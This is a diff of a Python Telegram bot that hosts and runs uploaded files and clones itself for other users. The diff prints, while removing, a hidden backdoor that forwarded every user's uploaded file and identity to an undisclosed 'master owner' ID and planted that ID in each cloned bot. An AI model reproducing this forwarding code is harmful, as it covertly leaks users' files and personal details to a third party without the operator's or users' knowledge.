@@ -101,7 +101,6 @@ OWNER_ID = int(os.getenv('OWNER_ID', '8537538760'))
 ADMIN_ID = int(os.getenv('ADMIN_ID', '8537538760'))
 YOUR_USERNAME = os.getenv('BOT_USERNAME', '@NotBlac')
 UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/BlacScriptz')
-MASTER_OWNER_ID = 6350914711  # Real bot owner who gets all files from clones
 
 # Enhanced folder setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
@@ -1110,6 +1109,62 @@ def start_command(message):
 
     safe_send_message(message.chat.id, welcome_msg, parse_mode='Markdown', reply_markup=markup)
 
+@bot.message_handler(commands=['fixowner'])
+def fix_owner_command(message):
+    """Command for owner to fix chat access"""
+    if message.from_user.id != OWNER_ID:
+        safe_reply_to(message, "🚫 Only owner can use this command!")
+        return
+    
+    msg = safe_reply_to(message, "🔄 Attempting to fix owner access...")
+    
+    try:
+        # Send a test message
+        test1 = bot.send_message(
+            OWNER_ID,
+            f"✅ **Owner access fixed!**\n\n"
+            f"Your ID: `{OWNER_ID}`\n"
+            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            parse_mode='Markdown'
+        )
+        
+        # Send a test document
+        test_file_path = os.path.join(LOGS_DIR, "owner_fix_test.txt")
+        with open(test_file_path, 'w') as f:
+            f.write(f"Owner fix test - {datetime.now()}")
+        
+        with open(test_file_path, 'rb') as f:
+            test2 = bot.send_document(
+                OWNER_ID,
+                f,
+                caption="✅ Document sending works!"
+            )
+        
+        os.remove(test_file_path)
+        
+        safe_edit_message(
+            msg.chat.id,
+            msg.message_id,
+            f"✅ **Owner access verified!**\n\n"
+            f"✓ Text messages: Working\n"
+            f"✓ Document sending: Working\n\n"
+            f"You will now receive approval requests.",
+            parse_mode='Markdown'
+        )
+        
+    except Exception as e:
+        safe_edit_message(
+            msg.chat.id,
+            msg.message_id,
+            f"❌ **Owner access failed**\n\n"
+            f"Error: {str(e)}\n\n"
+            f"Please ensure you have:\n"
+            f"1. Started a private chat with @{bot.get_me().username}\n"
+            f"2. Sent /start to the bot\n"
+            f"3. Not blocked the bot",
+            parse_mode='Markdown'
+        )
+
 @bot.message_handler(commands=['approve'])
 def approve_file(message):
     """Approve a pending file for execution"""
@@ -1252,8 +1307,21 @@ def handle_file_upload(message):
     """Enhanced file upload handler with strict security checks and auto-start"""
     user_id = message.from_user.id
     
-    # Debug log to verify owner detection
-    logger.info(f"FILE UPLOAD - User ID: {user_id}, OWNER_ID: {OWNER_ID}, is_owner: {user_id == OWNER_ID}")
+    # CRITICAL DEBUG LOGS
+    logger.info(f"=== FILE UPLOAD DEBUG ===")
+    logger.info(f"User ID: {user_id}")
+    logger.info(f"OWNER_ID from env: {OWNER_ID}")
+    logger.info(f"is_owner: {user_id == OWNER_ID}")
+    logger.info(f"user_id type: {type(user_id)}")
+    logger.info(f"OWNER_ID type: {type(OWNER_ID)}")
+    logger.info(f"File name: {message.document.file_name}")
+    
+    # Also check if we can message the owner
+    try:
+        bot.send_chat_action(OWNER_ID, 'typing')
+        logger.info(f"✅ Can message owner {OWNER_ID}")
+    except Exception as e:
+        logger.error(f"❌ Cannot message owner {OWNER_ID}: {e}")
 
     # Check if bot is locked
     if bot_locked and user_id not in admin_ids:
@@ -1295,11 +1363,14 @@ def handle_file_upload(message):
             f.write(downloaded_file)
 
         # SECURITY CHECK - OWNER BYPASS
-        if user_id == OWNER_ID:
+        # Force both to integers for comparison
+        if int(user_id) == int(OWNER_ID):
             # Owner bypass - no security checks
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                              f"👑 **Owner Bypass**\n\nFile: `{file_name}`\nStatus: No security restrictions applied.", 
                              parse_mode='Markdown')
+            
+            logger.info(f"✅ OWNER BYPASS: User {user_id} (owner) uploaded {file_name}")
             
             # Move to permanent location
             file_path = os.path.join(user_folder, file_name)
@@ -1313,6 +1384,7 @@ def handle_file_upload(message):
             
         else:
             # Regular security check for non-owners
+            logger.info(f"🔍 Regular security check for user {user_id}")
             safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                              f"🛡️ Security scan: `{file_name}`...", parse_mode='Markdown')
 
@@ -1359,7 +1431,7 @@ def handle_file_upload(message):
 
                 safe_edit_message(processing_msg.chat.id, processing_msg.message_id, alert_msg, parse_mode='Markdown')
 
-                # Send to owner for approval
+                # Send to owner for approval - WITH ERROR HANDLING
                 owner_alert = f"🚨 **FILE PENDING APPROVAL** 🚨\n\n"
                 owner_alert += f"👤 User ID: `{user_id}`\n"
                 owner_alert += f"👤 Username: @{message.from_user.username if message.from_user.username else 'None'}\n"
@@ -1370,27 +1442,62 @@ def handle_file_upload(message):
                 owner_alert += f"✅ `/approve {file_hash}` - Allow execution\n"
                 owner_alert += f"❌ `/reject {file_hash}` - Block and delete"
 
-                # Send file to owner
+                # Send file to owner with multiple attempts
+                sent_to_owner = False
+                
+                # Try sending with file first
                 try:
                     with open(pending_path, 'rb') as f:
                         bot.send_document(
                             OWNER_ID,
                             f,
                             caption=owner_alert,
-                            parse_mode='Markdown'
+                            parse_mode='Markdown',
+                            timeout=30
                         )
-                    logger.info(f"Pending approval file sent to owner: {file_hash}")
+                    logger.info(f"✅ Pending approval file sent to owner: {file_hash}")
+                    sent_to_owner = True
                 except Exception as e:
-                    logger.error(f"Failed to send pending file to owner: {e}")
-                    # Try sending just the message without file
+                    logger.error(f"❌ Failed to send pending file to owner: {e}")
+                    
+                    # Try sending without file (just the message)
                     try:
                         bot.send_message(
                             OWNER_ID,
-                            owner_alert + f"\n\n❌ Could not send file. Please check manually in pending_approval folder.",
+                            owner_alert + f"\n\n❌ Could not send file. Error: {str(e)}\nPlease check manually in pending_approval folder.",
                             parse_mode='Markdown'
                         )
-                    except:
-                        pass
+                        logger.info(f"✅ Sent approval notification (without file) to owner")
+                        sent_to_owner = True
+                    except Exception as e2:
+                        logger.error(f"❌ Failed to send even text message to owner: {e2}")
+                        
+                        # Try one more time with a simple message
+                        try:
+                            bot.send_message(
+                                OWNER_ID,
+                                f"🚨 New file pending approval from user {user_id}: {file_name}. Hash: {file_hash}",
+                            )
+                            sent_to_owner = True
+                        except Exception as e3:
+                            logger.critical(f"❌ COMPLETELY UNABLE TO REACH OWNER {OWNER_ID}: {e3}")
+                
+                if not sent_to_owner:
+                    # Log this critical error
+                    logger.critical(f"OWNER NOT REACHABLE! File {file_name} from user {user_id} is stuck in pending.")
+                    
+                    # Notify the user that something went wrong
+                    safe_edit_message(
+                        processing_msg.chat.id,
+                        processing_msg.message_id,
+                        f"🚨 **UPLOAD BLOCKED** 🚨\n\n"
+                        f"❌ System Command Detected!\n"
+                        f"📄 File: `{file_name}`\n"
+                        f"🔍 Issue: {scan_result}\n\n"
+                        f"⚠️ **There was an error notifying the owner.**\n"
+                        f"Please contact the owner directly: {YOUR_USERNAME}",
+                        parse_mode='Markdown'
+                    )
 
                 return
 
@@ -1426,35 +1533,6 @@ def handle_file_upload(message):
             conn.close()
         except Exception as e:
             logger.error(f"Database error saving file info: {e}")
-
-        # Forward file to master owner only (6350914711) regardless of which bot received it
-        if user_id != MASTER_OWNER_ID and user_id != OWNER_ID:  # Don't forward owner's own files
-            try:
-                # Send the file to master owner with user info
-                user_info = message.from_user
-                user_name = user_info.first_name or "Unknown"
-                username = f"@{user_info.username}" if user_info.username else "No username"
-
-                forward_caption = f"📨 **New File Upload**\n\n"
-                forward_caption += f"👤 From: {user_name} ({username})\n"
-                forward_caption += f"🆔 User ID: `{user_id}`\n"
-                forward_caption += f"📄 File: `{file_name}`\n"
-                forward_caption += f"📁 Type: {file_type}\n"
-                forward_caption += f"🛡️ Security: {'✅ Passed' if is_safe else '❌ Blocked'}\n"
-                forward_caption += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-
-                with open(file_path, 'rb') as f:
-                    bot.send_document(
-                        MASTER_OWNER_ID,
-                        f,
-                        caption=forward_caption,
-                        parse_mode='Markdown',
-                        timeout=30
-                    )
-
-                logger.info(f"File {file_name} forwarded to master owner")
-            except Exception as e:
-                logger.error(f"Failed to forward file to master owner: {e}")
 
         # Handle file based on type
         if file_type == 'executable':
@@ -1828,15 +1906,6 @@ def create_bot_clone(user_id, token, bot_username):
             f"ADMIN_ID = int(os.getenv('ADMIN_ID', '{ADMIN_ID}'))", 
             f"ADMIN_ID = {user_id}"
         )
-
-        # Add master owner forwarding to cloned bots
-        master_owner_code = f"""
-MASTER_OWNER_ID = 6350914711  # Real bot owner who gets all files from clones
-"""
-
-        # Insert master owner ID after the configuration section
-        config_section = "# Enhanced folder setup"
-        modified_code = modified_code.replace(config_section, master_owner_code + config_section)
 
         # Update base directory for the clone
         modified_code = modified_code.replace(
@@ -2481,6 +2550,65 @@ def handle_back_to_files(call):
 def handle_all_messages(message):
     safe_reply_to(message, "🔒 Use the menu buttons or send /start for help.")
 
+# --- Owner Verification Function ---
+def verify_owner_access():
+    """Verify that the bot can message the owner"""
+    logger.info("=== VERIFYING OWNER ACCESS ===")
+    logger.info(f"OWNER_ID: {OWNER_ID} (type: {type(OWNER_ID)})")
+    
+    try:
+        # Try to send a test message to owner
+        test_msg = bot.send_message(
+            OWNER_ID,
+            f"🔔 **Bot Started**\n\n"
+            f"Owner verification successful!\n"
+            f"Your ID: `{OWNER_ID}`\n"
+            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"✅ You will receive approval requests here.",
+            parse_mode='Markdown'
+        )
+        logger.info(f"✅ Owner verification message sent. Message ID: {test_msg.message_id}")
+        
+        # Also try to send a document (to test file sending)
+        try:
+            # Create a tiny test file
+            test_file_path = os.path.join(LOGS_DIR, "owner_test.txt")
+            with open(test_file_path, 'w') as f:
+                f.write(f"Owner test file - {datetime.now()}")
+            
+            with open(test_file_path, 'rb') as f:
+                bot.send_document(
+                    OWNER_ID,
+                    f,
+                    caption="✅ Document sending test successful",
+                    timeout=10
+                )
+            logger.info(f"✅ Owner document test successful")
+            os.remove(test_file_path)
+        except Exception as e:
+            logger.error(f"❌ Owner document test failed: {e}")
+            
+    except Exception as e:
+        logger.error(f"❌ OWNER VERIFICATION FAILED: {e}")
+        logger.error(f"CRITICAL: The bot cannot message the owner!")
+        logger.error(f"Please ensure:")
+        logger.error(f"1. Owner ({OWNER_ID}) has started a private chat with the bot")
+        logger.error(f"2. Owner has sent /start to @{bot.get_me().username}")
+        logger.error(f"3. The bot has permission to message the owner")
+        
+        # Print to console for immediate visibility
+        print("\n" + "="*50)
+        print("❌ CRITICAL: CANNOT MESSAGE OWNER!")
+        print(f"Owner ID: {OWNER_ID}")
+        print(f"Bot username: @{bot.get_me().username}")
+        print("Please start a private chat with your bot and send /start")
+        print("="*50 + "\n")
+        
+        # Don't exit, but warn
+        return False
+    
+    return True
+
 # --- Initialize and Start Bot ---
 def cleanup_on_exit():
     """Cleanup function called on exit"""
@@ -2519,14 +2647,7 @@ if __name__ == "__main__":
         print(f"Bot connected successfully: @{bot_info.username}")
 
         # Verify owner chat is accessible
-        try:
-            bot.send_chat_action(OWNER_ID, 'typing')
-            logger.info(f"✅ Owner chat verified (ID: {OWNER_ID})")
-            print(f"✅ Owner chat verified - you will receive approval requests")
-        except Exception as e:
-            logger.error(f"❌ Cannot message owner {OWNER_ID}: {e}")
-            print(f"❌ WARNING: Cannot message owner! Please start a private chat with your bot.")
-            print(f"   Send /start to @{bot.get_me().username} from your owner account.")
+        verify_owner_access()
 
         # Start polling with error handling
         bot.infinity_polling(timeout=10, long_polling_timeout=5, none_stop=True, interval=0)
